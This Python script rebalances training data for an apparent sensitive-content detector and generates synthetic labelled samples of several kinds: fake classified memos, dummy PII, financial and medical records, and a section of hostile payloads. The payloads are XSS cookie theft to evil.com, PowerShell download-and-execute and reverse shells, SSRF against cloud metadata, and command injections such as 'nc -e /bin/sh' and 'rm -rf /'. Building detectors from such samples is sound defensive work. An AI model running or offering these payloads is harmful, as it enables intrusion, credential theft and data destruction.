#!/usr/bin/env python3
"""
TorchSight Dataset Rebalancer

Reads combined_train.jsonl, downsamples overrepresented subcategories,
generates new samples for underrepresented areas, and produces a
balanced dataset.

Target: ~65K samples, no subcategory over 5K, weak areas boosted.
"""

import json
import random
import re
from pathlib import Path
from collections import Counter, defaultdict

SCRIPT_DIR = Path(__file__).resolve().parent
DATA_DIR = SCRIPT_DIR.parent / "data" / "processed"
INPUT = DATA_DIR / "combined_train.jsonl"
OUTPUT = DATA_DIR / "combined_train_balanced.jsonl"

random.seed(42)

# =============================================================================
# STEP 1: Load and bucket existing data by primary subcategory
# =============================================================================

print("Loading existing data...")
records_by_subcat = defaultdict(list)
all_records = []

with open(INPUT) as f:
    for line in f:
        rec = json.loads(line)
        all_records.append(rec)
        # Primary subcategory = first finding's subcategory
        findings = rec.get("findings", [])
        if findings:
            subcat = findings[0].get("subcategory", "unknown")
        else:
            subcat = "unknown"
        records_by_subcat[subcat].append(rec)

print(f"Loaded {len(all_records)} records across {len(records_by_subcat)} subcategories")

# =============================================================================
# STEP 2: Downsample overrepresented subcategories
# =============================================================================

MAX_PER_SUBCAT = 5000  # Balance: preserve volume while preventing any subcategory from dominating

balanced = []
for subcat, recs in records_by_subcat.items():
    if len(recs) > MAX_PER_SUBCAT:
        sampled = random.sample(recs, MAX_PER_SUBCAT)
        print(f"  Downsampled {subcat}: {len(recs)} -> {len(sampled)}")
        balanced.extend(sampled)
    else:
        balanced.extend(recs)

print(f"\nAfter downsampling: {len(balanced)} records")

# =============================================================================
# STEP 3: Generate new samples for weak areas
# =============================================================================

new_samples = []
sample_id = 0

def make_id():
    global sample_id
    sample_id += 1
    return f"synth_v3_{sample_id:05d}"

def make_record(text, findings, source="synthetic_v3"):
    return {
        "id": make_id(),
        "source": source,
        "source_license": "synthetic",
        "text": text,
        "findings": findings,
    }

# ─── 3A: Classified / Government Documents (1400 new) ───

CLASSIFICATION_LEVELS = [
    ("TOP SECRET", "critical"),
    ("TOP SECRET // SCI", "critical"),
    ("TOP SECRET // SCI // NOFORN", "critical"),
    ("SECRET", "critical"),
    ("SECRET // NOFORN", "critical"),
    ("CONFIDENTIAL", "high"),
    ("CONFIDENTIAL // REL TO USA, GBR", "high"),
    ("RESTRICTED", "medium"),
    ("FOR OFFICIAL USE ONLY", "info"),
    ("UNCLASSIFIED // FOR OFFICIAL USE ONLY", "info"),
    ("CUI // SP-INTEL", "medium"),
    ("CONTROLLED UNCLASSIFIED INFORMATION", "medium"),
]

CLASSIFIED_TOPICS = [
    ("Operation Crimson Dawn", "intelligence assessment", "SIGINT intercepts indicate hostile cyber operations targeting critical infrastructure in sector 7. NSA confirms attribution to APT-41."),
    ("Project Blackbird", "weapons system evaluation", "Field testing of XM-7 directed energy prototype at White Sands. Results exceed threshold parameters by 340%."),
    ("Diplomatic Cable BERLIN-4421", "embassy communication", "Ambassador reports potential nuclear proliferation activity. IAEA inspection team denied access to facility at coordinates 51.1657°N."),
    ("National Intelligence Estimate", "strategic assessment", "PRC military modernization accelerating beyond previous projections. Space-based assets deployment timeline moved to 2027."),
    ("FISA Application #2024-1847", "surveillance authorization", "Court-authorized electronic surveillance of Subject FALCON. Phone intercepts and email monitoring approved for 90 days."),
    ("COMSEC Audit Report", "communications security", "Multiple COMSEC violations detected at Fort Meade. Unencrypted classified discussions on commercial cell phones."),
    ("Counterintelligence Brief", "CI assessment", "Foreign intelligence service recruitment attempts targeting cleared personnel at defense contractors in the DMV area."),
    ("Nuclear Posture Review", "strategic deterrence", "Recommended modernization of Minuteman III replacement program. Warhead lifecycle extension approved through 2045."),
    ("SOCOM After Action Report", "military operations", "Special operations team VIPER conducted direct action mission at grid reference 33.8688°S, 151.2093°E. Three HVTs neutralized."),
    ("Cybersecurity Incident Report", "cyber operations", "Nation-state actor compromised JWICS terminal at CENTCOM. Lateral movement detected across 14 classified networks."),
    ("Presidential Daily Brief", "intelligence summary", "Key developments: Iranian enrichment levels exceed 90% threshold. North Korean mobile launcher activity detected at Sunchon."),
    ("Defense Intelligence Assessment", "threat analysis", "Russian Black Sea Fleet repositioning assets. Submarine activity in Mediterranean consistent with pre-conflict patterns."),
    ("Biological Defense Program", "WMD assessment", "Classified research at USAMRIID identifies novel synthetic biology threat vectors. Countermeasure development timeline: 18 months."),
    ("Space Command Situational Awareness", "space operations", "Anomalous satellite maneuvers detected in GEO belt. Object 2024-047A performed 3 proximity operations near allied SATCOM assets."),
]

print("\nGenerating classified documents...")
for i in range(1400):
    level, severity = random.choice(CLASSIFICATION_LEVELS)
    topic_name, topic_type, topic_body = random.choice(CLASSIFIED_TOPICS)

    headers = [
        f"{level}\n\n{topic_name}\n\nClassification: {level}\nType: {topic_type.upper()}\n\n{topic_body}",
        f"CLASSIFICATION: {level}\n\nSUBJECT: {topic_name}\nDATE: 2024-{random.randint(1,12):02d}-{random.randint(1,28):02d}\nFROM: DIRECTOR, NATIONAL INTELLIGENCE\nTO: NATIONAL SECURITY COUNCIL\n\n{topic_body}\n\nDeclassification: OADR\nDerived from: Multiple Sources",
        f"── {level} ──\n\nMEMORANDUM FOR: SecDef\nSUBJECT: {topic_name}\n\nPURPOSE: Provide update on {topic_type}.\n\nDISCUSSION:\n{topic_body}\n\nRECOMMENDATION: Escalate to Principals Committee.\n\nClassification Authority: EO 13526\nDeclassify On: 20490101",
        f"{level}\nDISTRIBUTION: EYES ONLY\n\nINTELLIGENCE INFORMATION REPORT\nSerial: DIR-{random.randint(1000,9999)}-{random.randint(10,99)}\n\n{topic_name}: {topic_body}\n\nSOURCE RELIABILITY: A\nINFORMATION CONTENT: 1\n\nWARNING: Unauthorized disclosure subject to criminal sanctions under 18 U.S.C. § 798.",
    ]

    text = random.choice(headers)

    subcategory = random.choice([
        "confidential.classified", "confidential.intelligence",
        "confidential.military",
    ])

    findings = [{
        "category": "confidential",
        "subcategory": subcategory,
        "severity": severity,
        "explanation": f"Document bears classification marking '{level}'. Contains {topic_type} information protected under EO 13526 and potentially subject to criminal penalties for unauthorized disclosure under 18 U.S.C. § 798.",
    }]

    new_samples.append(make_record(text, findings))

# ─── 3B: Safe tutorials / placeholder credentials (1500 new) ───

print("Generating safe tutorial/placeholder samples...")

TUTORIAL_TEMPLATES = [
    """# Setting Up {service} Authentication

To configure {service}, you'll need an API key. Here's an example:

```bash
export {var}={example_key}
```

**Important**: The key above is a placeholder. Never commit real credentials to version control.
Replace `{example_key}` with your actual key from the {service} dashboard.

```python
import {lib}

client = {lib}.Client(api_key="{example_key}")
# This is a demo - use environment variables in production
```""",

    """## {service} Quick Start Guide

### Step 1: Get your API key
Visit https://{service_lower}.com/settings/api-keys

### Step 2: Configure your environment
```
{var}={example_key}
{var2}={example_key2}
```

These are **example values** from the documentation. Your real keys will look different.

### Step 3: Test the connection
```python
response = requests.get("https://api.{service_lower}.com/v1/test",
    headers={{"Authorization": "Bearer {example_key}"}})
print(response.status_code)  # Should return 200
```""",

    """// {service} Configuration Example
// Documentation: https://docs.{service_lower}.com/auth

const config = {{
  apiKey: "{example_key}",      // Replace with your key
  secret: "{example_key2}",     // Replace with your secret
  environment: "sandbox",       // Change to "production" for live
}};

// NOTE: These are test/sandbox credentials.
// Never hardcode production credentials in source code.
// Use environment variables: process.env.{var}""",

    """# Unit Test: {service} Client
# These credentials are fake/mock values for testing only

import pytest
from unittest.mock import patch

MOCK_API_KEY = "{example_key}"
MOCK_SECRET = "{example_key2}"
MOCK_TOKEN = "test-token-not-real-{rand}"

@pytest.fixture
def mock_client():
    return Client(api_key=MOCK_API_KEY, secret=MOCK_SECRET)

def test_authentication(mock_client):
    assert mock_client.is_configured()
    assert mock_client.api_key == MOCK_API_KEY""",

    """# Docker Compose - Local Development
# Default credentials for local development only

version: '3.8'
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: {example_key}
      POSTGRES_USER: devuser
      POSTGRES_DB: myapp_dev

  redis:
    image: redis:7
    command: redis-server --requirepass {example_key2}

  app:
    build: .
    environment:
      DATABASE_URL: postgresql://devuser:{example_key}@db:5432/myapp_dev
      REDIS_URL: redis://:{example_key2}@redis:6379
      SECRET_KEY: local-dev-secret-not-for-production
      DEBUG: "true"

# WARNING: These are development defaults. Never use in production.""",
]

SERVICES = [
    ("AWS", "aws", "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID", "boto3",
     "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "AKIAIOSFODNN7EXAMPLE"),
    ("Stripe", "stripe", "STRIPE_SECRET_KEY", "STRIPE_PUBLISHABLE_KEY", "stripe",
     "sk_test_4eC39HqLyjWDarjtT1zdp7dc", "pk_test_TYooMQauvdEDq54NiTphI7jx"),
    ("GitHub", "github", "GITHUB_TOKEN", "GITHUB_APP_ID", "github",
     "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "12345"),
    ("OpenAI", "openai", "OPENAI_API_KEY", "OPENAI_ORG_ID", "openai",
     "sk-proj-xxxxxxxxxxxxxxxxxxxxxxxxxxxx", "org-xxxxxxxxxxxx"),
    ("Twilio", "twilio", "TWILIO_AUTH_TOKEN", "TWILIO_ACCOUNT_SID", "twilio",
     "your_auth_token_here", "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"),
    ("SendGrid", "sendgrid", "SENDGRID_API_KEY", "SENDGRID_FROM_EMAIL", "sendgrid",
     "SG.xxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "noreply@example.com"),
    ("Firebase", "firebase", "FIREBASE_API_KEY", "FIREBASE_PROJECT_ID", "firebase_admin",
     "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", "my-project-12345"),
    ("Slack", "slack", "SLACK_BOT_TOKEN", "SLACK_SIGNING_SECRET", "slack_sdk",
     "xoxb-not-a-real-token-placeholder", "not-a-real-signing-secret"),
    ("MongoDB", "mongodb", "MONGO_URI", "MONGO_DB_NAME", "pymongo",
     "mongodb://user:password@localhost:27017/testdb", "testdb"),
    ("Datadog", "datadog", "DD_API_KEY", "DD_APP_KEY", "datadog_api_client",
     "xxxxxxxxxxxxxxxxxxxxxxxxxxxx", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"),
]

for i in range(1500):
    service, service_lower, var, var2, lib, example_key, example_key2 = random.choice(SERVICES)
    template = random.choice(TUTORIAL_TEMPLATES)
    text = template.format(
        service=service, service_lower=service_lower,
        var=var, var2=var2, lib=lib,
        example_key=example_key, example_key2=example_key2,
        rand=random.randint(1000, 9999),
    )

    safe_sub = random.choice(["safe.documentation", "safe.code", "safe.config"])
    findings = [{
        "category": "safe",
        "subcategory": safe_sub,
        "severity": "info",
        "explanation": f"This is a {service} tutorial/example containing placeholder credentials ('{example_key[:20]}...'). These are not real credentials - they are documentation examples, test fixtures, or local development defaults. No security risk.",
    }]
    new_samples.append(make_record(text, findings))

# ─── 3C: XSS / PowerShell / SSRF / Command Injection (1200 new) ───

print("Generating malicious payload samples...")

XSS_PAYLOADS = [
    '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    '<img src=x onerror="fetch(\'http://attacker.com/log?cookie=\'+document.cookie)">',
    '<svg onload="new Image().src=\'http://evil.com/?\'+document.cookie">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<iframe src="javascript:alert(document.domain)">',
    '<body onload="window.location=\'http://evil.com/phish\'">',
    '{{constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")}}',
    '<input onfocus="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))" autofocus>',
    '<details open ontoggle="fetch(\'https://evil.com/exfil?d=\'+document.cookie)">',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
]

POWERSHELL_PAYLOADS = [
    'powershell -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==',
    'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
    'powershell -w hidden -nop -c "$c=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\'H4sIAAAAAAAA...\'));IEX(New-Object IO.StreamReader(New-Object IO.Compression.GZipStream($c,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"',
    'Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami > C:\\temp\\output.txt" -WindowStyle Hidden',
    'Invoke-Expression (Invoke-WebRequest -Uri "http://c2.evil.com/beacon" -UseBasicParsing).Content',
    '$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0");$wc.DownloadFile("http://evil.com/trojan.exe","C:\\Users\\Public\\svchost.exe");Start-Process "C:\\Users\\Public\\svchost.exe"',
    'powershell -nop -w hidden -c "$s=New-Object Net.Sockets.TCPClient(\'10.10.14.5\',4444);$stream=$s.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\'PS \'+$(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"',
]

SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'http://169.254.169.254/metadata/v1.json',
    'http://[::ffff:169.254.169.254]/latest/meta-data/',
    'http://2852039166/latest/meta-data/',  # decimal IP for 169.254.169.254
    'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
    'dict://127.0.0.1:6379/CONFIG SET dir /var/www/html',
    'file:///etc/passwd',
    'http://localhost:8500/v1/agent/self',  # Consul
    'http://127.0.0.1:2375/containers/json',  # Docker API
]

CMD_INJECTION_PAYLOADS = [
    '; cat /etc/passwd',
    '| nc attacker.com 4444 -e /bin/sh',
    '`curl http://evil.com/shell.sh | bash`',
    '$(wget -q -O- http://evil.com/backdoor.py | python3)',
    '; rm -rf / --no-preserve-root',
    '&& curl http://evil.com/exfil -d @/etc/shadow',
    '|| touch /tmp/pwned && echo "compromised"',
    '\nping -c 3 attacker.com\n',
    '"; import os; os.system("id") #',
    '__import__("os").popen("cat /etc/passwd").read()',
]

for i in range(300):
    payload = random.choice(XSS_PAYLOADS)
    context = random.choice([
        f"User submitted the following comment:\n\n{payload}\n\nThis was posted on the public forum.",
        f"Form field 'name' contained: {payload}",
        f"GET /search?q={payload} HTTP/1.1\nHost: vulnerable-app.com\nUser-Agent: Mozilla/5.0",
        f"Error log entry:\n[ERROR] Invalid input detected in parameter 'callback': {payload}",
    ])
    new_samples.append(make_record(context, [{
        "category": "malicious",
        "subcategory": "malicious.injection",
        "severity": "critical",
        "explanation": f"Cross-site scripting (XSS) payload detected. The input contains executable JavaScript that attempts to steal cookies or redirect users. Payload: '{payload[:80]}...'. This can lead to session hijacking, credential theft, or defacement.",
    }]))

for i in range(300):
    payload = random.choice(POWERSHELL_PAYLOADS)
    context = random.choice([
        f"Suspicious process detected:\n\n{payload}\n\nExecuted by user SYSTEM at 03:42:17 UTC",
        f"Email attachment macro content:\n\nSub AutoOpen()\n    Shell \"{payload}\"\nEnd Sub",
        f"Scheduled task found:\n  Name: WindowsUpdate\n  Command: {payload}\n  Trigger: On logon\n  User: NT AUTHORITY\\SYSTEM",
        f"Endpoint detection log:\nProcess: powershell.exe\nCommand line: {payload}\nParent: winword.exe\nRisk: HIGH",
    ])
    new_samples.append(make_record(context, [{
        "category": "malicious",
        "subcategory": "malicious.shell",
        "severity": "critical",
        "explanation": f"Malicious PowerShell execution detected. The command uses obfuscation techniques (encoded commands, bypass flags, hidden windows) to download and execute a remote payload. This is consistent with post-exploitation or initial access tradecraft.",
    }]))

for i in range(300):
    payload = random.choice(SSRF_PAYLOADS)
    context = random.choice([
        f"Web application request log:\nURL parameter 'url' set to: {payload}\nThis request was made from the application server.",
        f"Webhook configuration:\n  Target URL: {payload}\n  Created by: user@company.com\n  Status: Active",
        f"Image proxy request:\nGET /proxy?src={payload}\nHost: app.company.com",
        f"PDF generator input:\nrender_url: {payload}\nRequested by: API client 'pdf-service'",
    ])
    new_samples.append(make_record(context, [{
        "category": "malicious",
        "subcategory": "malicious.ssrf",
        "severity": "critical",
        "explanation": f"Server-Side Request Forgery (SSRF) attempt detected. The URL '{payload}' targets internal cloud metadata services or localhost services to extract credentials, tokens, or sensitive configuration. This can lead to full cloud account compromise.",
    }]))

for i in range(300):
    payload = random.choice(CMD_INJECTION_PAYLOADS)
    context = random.choice([
        f"System command log:\n  Input: filename=report.pdf{payload}\n  Executed as: www-data",
        f"Application error:\nCommand failed: /usr/bin/convert input.png {payload} output.jpg\nExit code: 1",
        f"API request body:\n{{\n  \"hostname\": \"server1{payload}\",\n  \"action\": \"ping\"\n}}",
        f"CGI script input:\nQUERY_STRING=ip=8.8.8.8{payload}",
    ])
    new_samples.append(make_record(context, [{
        "category": "malicious",
        "subcategory": "malicious.injection",
        "severity": "critical",
        "explanation": f"OS command injection payload detected in user-controlled input. The payload '{payload.strip()[:60]}' attempts to execute arbitrary system commands by breaking out of the intended command context. This can lead to remote code execution and full system compromise.",
    }]))

# ─── 3D: Financial documents (800 new) ───

print("Generating financial samples...")

FIRST_NAMES = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
               "David", "Elizabeth", "William", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
               "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Lisa", "Daniel", "Nancy"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
              "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
              "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White"]

def rand_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def rand_ssn():
    return f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"

def rand_cc():
    prefix = random.choice(["4532", "5412", "3782", "6011"])
    return f"{prefix}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"

def rand_acct():
    return ''.join([str(random.randint(0,9)) for _ in range(10)])

def rand_routing():
    return random.choice(["021000021", "021200339", "011401533", "091000019", "071000013"])

for i in range(400):
    name = rand_name()
    text = f"""WIRE TRANSFER AUTHORIZATION

From: {random.choice(["First National Bank", "Chase Bank", "Wells Fargo", "Bank of America", "Citibank"])}
Account Holder: {name}
Account Number: {rand_acct()}
Routing Number: {rand_routing()}

Transfer Amount: ${random.randint(5000, 999999):,.2f}
Recipient: {random.choice(["Offshore Holdings Ltd", "Global Trading Corp", "Pacific Investments", "Summit Financial"])}
Recipient Account: {random.choice(["CH", "DE", "GB", "LU"])}{random.randint(10,99)} {random.randint(1000,9999)} {random.randint(1000,9999)} {random.randint(1000,9999)}

Credit Card on File: {rand_cc()}, Exp: {random.randint(1,12):02d}/{random.randint(25,29)}, CVV: {random.randint(100,999)}
"""
    findings = [
        {"category": "financial", "subcategory": "financial.bank_account", "severity": "critical",
         "explanation": f"Bank account information exposed for {name}. Account and routing numbers can be used to initiate unauthorized ACH transfers or wire fraud."},
        {"category": "financial", "subcategory": "financial.credit_card", "severity": "critical",
         "explanation": f"Full credit card number with expiration and CVV exposed. This violates PCI-DSS requirements and enables unauthorized charges."},
        {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
         "explanation": f"Personal identity information for {name} exposed alongside financial data, increasing identity theft risk."},
    ]
    new_samples.append(make_record(text, findings))

for i in range(400):
    name = rand_name()
    ssn = rand_ssn()
    text = f"""TAX RETURN - FORM 1040
Tax Year: {random.choice(["2023", "2024"])}

Taxpayer: {name}
SSN: {ssn}
Filing Status: {random.choice(["Single", "Married Filing Jointly", "Head of Household"])}
Address: {random.randint(100,9999)} {random.choice(["Oak", "Maple", "Pine", "Cedar", "Elm"])} {random.choice(["St", "Ave", "Dr", "Ln"])}, {random.choice(["Austin, TX", "Denver, CO", "Portland, OR", "Miami, FL"])}

Wages (W-2): ${random.randint(45000, 350000):,.00f}
Interest Income: ${random.randint(100, 15000):,.00f}
Capital Gains: ${random.randint(0, 50000):,.00f}
Total Income: ${random.randint(50000, 400000):,.00f}

Federal Tax Withheld: ${random.randint(8000, 80000):,.00f}
Refund/Amount Due: ${random.randint(-5000, 15000):,.00f}

Direct Deposit:
  Bank: {random.choice(["Chase", "Wells Fargo", "Bank of America", "TD Bank"])}
  Routing: {rand_routing()}
  Account: {rand_acct()}
"""
    findings = [
        {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
         "explanation": f"Personal identity information including name ({name}) and SSN ({ssn[:3]}-XX-{ssn[-4:]}) exposed in tax return. SSN combined with address enables identity theft."},
        {"category": "financial", "subcategory": "financial.tax", "severity": "critical",
         "explanation": f"Complete tax return with income details, deductions, and filing status. Exposes taxpayer's full financial picture."},
        {"category": "financial", "subcategory": "financial.bank_account", "severity": "critical",
         "explanation": f"Direct deposit bank account and routing number exposed. Can be used for unauthorized ACH transfers."},
    ]
    new_samples.append(make_record(text, findings))

# ─── 3E: HR / Employee Records with PII + Financial (800 new) ───

print("Generating HR/employee records...")

DEPARTMENTS = ["Engineering", "Marketing", "Finance", "Legal", "Operations", "Sales", "HR", "Product"]
TITLES = ["Software Engineer", "Senior Developer", "Product Manager", "Data Analyst", "VP of Engineering",
          "Director of Marketing", "Staff Engineer", "Principal Architect", "Engineering Manager"]

for i in range(800):
    name = rand_name()
    ssn = rand_ssn()
    salary = random.randint(65000, 300000)
    bonus_pct = random.choice([5, 10, 15, 20, 25])
    bonus = int(salary * bonus_pct / 100)

    text = f"""EMPLOYEE RECORD - CONFIDENTIAL

Employee: {name}
Employee ID: EMP-{random.randint(2020,2025)}-{random.randint(1000,9999)}
SSN: {ssn}
DOB: {random.randint(1,12):02d}/{random.randint(1,28):02d}/{random.randint(1965,1998)}
Department: {random.choice(DEPARTMENTS)}
Title: {random.choice(TITLES)}

Compensation:
  Base Salary: ${salary:,}/year
  Annual Bonus: ${bonus:,} ({bonus_pct}%)
  Stock Options: {random.randint(1000,20000):,} shares RSU vesting over 4 years
  401(k): {random.randint(3,10)}% with {random.randint(3,6)}% company match

Direct Deposit:
  Bank: {random.choice(["Chase", "Wells Fargo", "Bank of America", "TD Bank", "US Bank"])}
  Account: {rand_acct()}
  Routing: {rand_routing()}

Performance Rating: {random.choice(["Exceeds Expectations", "Meets Expectations", "Outstanding"])}
Manager: {rand_name()}
Next Review: {random.choice(["2025-03", "2025-06", "2025-09"])}
"""
    findings = [
        {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
         "explanation": f"Personal identity information for {name} including SSN ({ssn[:3]}-XX-{ssn[-4:]}), date of birth, and employee ID. This data combined enables identity theft and unauthorized benefits access."},
        {"category": "financial", "subcategory": "financial.bank_account", "severity": "critical",
         "explanation": f"Direct deposit banking information (account and routing numbers) for {name}. Can be used to redirect payroll or initiate unauthorized transfers."},
        {"category": "confidential", "subcategory": "confidential.internal", "severity": "high",
         "explanation": f"Confidential compensation data including salary (${salary:,}), bonus, and stock options. Unauthorized disclosure could impact employee relations and competitive positioning."},
    ]
    new_samples.append(make_record(text, findings))

# ─── 3F: Medical records (600 new) ───

print("Generating medical records...")

DIAGNOSES = [
    ("Type 2 Diabetes Mellitus", "Metformin 500mg twice daily, Glipizide 5mg daily"),
    ("Major Depressive Disorder", "Sertraline 100mg daily, Cognitive Behavioral Therapy"),
    ("Acute myocardial infarction (STEMI)", "Aspirin 325mg, Clopidogrel 75mg, Atorvastatin 80mg"),
    ("Stage IIIA Non-Small Cell Lung Cancer", "Carboplatin/Paclitaxel chemotherapy, radiation therapy"),
    ("HIV-1 Infection", "Biktarvy (bictegravir/emtricitabine/tenofovir) once daily"),
    ("Bipolar I Disorder", "Lithium 300mg TID, Quetiapine 200mg QHS"),
    ("Rheumatoid Arthritis", "Methotrexate 15mg weekly, Humira 40mg biweekly"),
    ("Chronic Kidney Disease Stage 4", "Losartan 50mg daily, Sodium bicarbonate, EPO injections"),
    ("Hepatitis C (Genotype 1a)", "Mavyret (glecaprevir/pibrentasvir) 8-week course"),
    ("Opioid Use Disorder", "Suboxone 8mg/2mg sublingual daily, counseling"),
]

INSURERS = ["Aetna PPO", "Blue Cross Blue Shield", "UnitedHealthcare", "Cigna", "Humana", "Kaiser Permanente"]

for i in range(600):
    name = rand_name()
    diagnosis, medications = random.choice(DIAGNOSES)
    insurer = random.choice(INSURERS)
    insurance_id = f"{insurer[:3].upper()}-{random.randint(100000,999999)}"

    text = f"""PATIENT CHART - PROTECTED HEALTH INFORMATION

Patient: {name}
DOB: {random.randint(1,12):02d}/{random.randint(1,28):02d}/{random.randint(1945,1990)}
MRN: MG-{random.randint(2020,2025)}-{random.randint(10000,99999)}
Insurance: {insurer} #{insurance_id}

Chief Complaint: {random.choice(["Persistent symptoms", "Follow-up visit", "Acute presentation", "Routine check"])}
Diagnosis: {diagnosis}
Treatment Plan: {medications}

Lab Results:
  CBC: WNL
  CMP: {random.choice(["WNL", "Elevated creatinine", "Low albumin", "Elevated glucose"])}
  A1C: {random.uniform(5.0, 12.0):.1f}%

Allergies: {random.choice(["Penicillin", "Sulfa drugs", "NKDA", "Latex", "Codeine"])}
Emergency Contact: {rand_name()} ({random.choice(["spouse", "parent", "sibling"])}) - ({random.randint(200,999)}) {random.randint(200,999)}-{random.randint(1000,9999)}
"""
    findings = [
        {"category": "medical", "subcategory": "medical.diagnosis", "severity": "critical",
         "explanation": f"Protected health information (PHI) for {name}. Diagnosis: {diagnosis}. This is HIPAA-protected data requiring safeguards under 45 CFR Part 164."},
        {"category": "medical", "subcategory": "medical.prescription", "severity": "critical",
         "explanation": f"Medication information for {name}: {medications}. Prescription data reveals sensitive health conditions and is protected under HIPAA."},
        {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
         "explanation": f"Patient identity information including name, date of birth, and medical record number. Combined with diagnosis, this constitutes a HIPAA breach if disclosed."},
        {"category": "medical", "subcategory": "medical.insurance", "severity": "medium",
         "explanation": f"Health insurance information: {insurer} #{insurance_id}. Insurance IDs can be used for fraudulent claims."},
    ]
    new_samples.append(make_record(text, findings))

# ─── 3G: PII documents (600 new) ───

print("Generating PII-heavy samples...")

for i in range(600):
    name = rand_name()
    ssn = rand_ssn()
    email = f"{name.split()[0].lower()}.{name.split()[1].lower()}@{random.choice(['gmail.com', 'yahoo.com', 'company.com', 'outlook.com'])}"
    phone = f"({random.randint(200,999)}) {random.randint(200,999)}-{random.randint(1000,9999)}"

    template = random.choice([
        f"""Customer Account Information
Name: {name}
SSN: {ssn}
Email: {email}
Phone: {phone}
Address: {random.randint(100,9999)} {random.choice(["Main", "Broadway", "Park", "Lake"])} {random.choice(["St", "Ave"])}, {random.choice(["New York, NY", "Los Angeles, CA", "Chicago, IL"])} {random.randint(10000,99999)}
Driver's License: {random.choice(["CA", "NY", "TX", "FL"])}-{random.randint(10000000,99999999)}
DOB: {random.randint(1,12):02d}/{random.randint(1,28):02d}/{random.randint(1960,2000)}""",

        f"""Background Check Report
Subject: {name}
SSN: {ssn}
Date of Birth: {random.randint(1960,1995)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}
Phone: {phone}
Email: {email}
Current Address: {random.randint(100,9999)} {random.choice(["Oak", "Elm", "Pine"])} Dr, {random.choice(["Seattle, WA", "Boston, MA", "Denver, CO"])}
Criminal Record: {random.choice(["None found", "1 misdemeanor (2019)", "Clean"])}
Credit Score: {random.randint(580,850)}
Employment Verified: Yes - {random.choice(["Google", "Microsoft", "Amazon", "Meta"])} ({random.randint(2018,2024)}-present)""",
    ])

    findings = [
        {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
         "explanation": f"Personally identifiable information for {name}: SSN ({ssn[:3]}-XX-{ssn[-4:]}), email ({email}), phone ({phone}). This data enables identity theft, account takeover, and social engineering attacks."},
        {"category": "pii", "subcategory": "pii.contact", "severity": "medium",
         "explanation": f"Contact information including email address and phone number for {name}. Can be used for phishing, spam, or social engineering."},
    ]
    new_samples.append(make_record(template, findings))


# =============================================================================
# STEP 4: Combine and write output
# =============================================================================

print(f"\nGenerated {len(new_samples)} new synthetic samples")
balanced.extend(new_samples)

# Final shuffle
random.shuffle(balanced)

# Final stats
final_subcats = Counter()
final_cats = Counter()
multi_count = 0
for rec in balanced:
    findings = rec.get("findings", [])
    if len(findings) > 1:
        multi_count += 1
    for f in findings:
        final_cats[f.get("category", "")] += 1
        final_subcats[f.get("subcategory", "")] += 1

print(f"\n{'='*60}")
print(f"FINAL DATASET: {len(balanced)} samples")
print(f"Multi-finding: {multi_count} ({100*multi_count/len(balanced):.1f}%)")
print(f"\n=== CATEGORIES ===")
for k, v in final_cats.most_common():
    print(f"  {k}: {v}")
print(f"\n=== SUBCATEGORIES (top 30) ===")
for k, v in final_subcats.most_common(30):
    print(f"  {k}: {v}")
print(f"\n=== SUBCATEGORIES > 5000 (should be none) ===")
for k, v in final_subcats.most_common():
    if v > 5000:
        print(f"  WARNING: {k}: {v}")

# Write
with open(OUTPUT, "w") as f:
    for rec in balanced:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

print(f"\nWritten to {OUTPUT}")
